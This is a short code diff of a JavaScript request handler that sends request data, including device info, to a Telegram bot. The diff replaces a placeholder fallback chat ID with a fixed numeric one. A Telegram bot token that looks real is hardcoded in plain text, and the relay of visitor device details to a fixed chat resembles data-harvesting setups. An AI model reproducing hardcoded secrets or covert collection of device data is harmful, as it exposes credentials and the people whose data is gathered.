@@ -4,7 +4,7 @@ export default async function handler(req, res) {
   }
 
   const TELEGRAM_BOT_TOKEN = "7737650968:AAHsvAEaKL5kOCcgQ4RPtyVjeN3-Hl5Aw1k";
-  const chatId = req.body.chatId || "YOUR_OWN_CHAT_ID"; // Fallback
+  const chatId = req.body.chatId || "7187468717"; // Fallback
 
   const message = `
 Device Info: ${req.body.device}
